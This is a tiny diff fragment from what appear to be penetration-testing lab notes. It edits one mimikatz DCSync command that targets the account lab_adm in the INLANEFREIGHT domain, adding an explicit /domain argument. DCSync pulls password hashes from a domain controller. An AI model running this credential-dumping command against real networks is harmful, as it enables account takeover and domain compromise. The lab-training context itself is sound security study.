@@ -28,5 +28,5 @@ or
 ```
 If Success:
 ```
-mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm
+mimikatz # lsadump::dcsync /user:INLANEFREIGHT\lab_adm /domain:INLANEFREIGHT.LOCAL
 ```
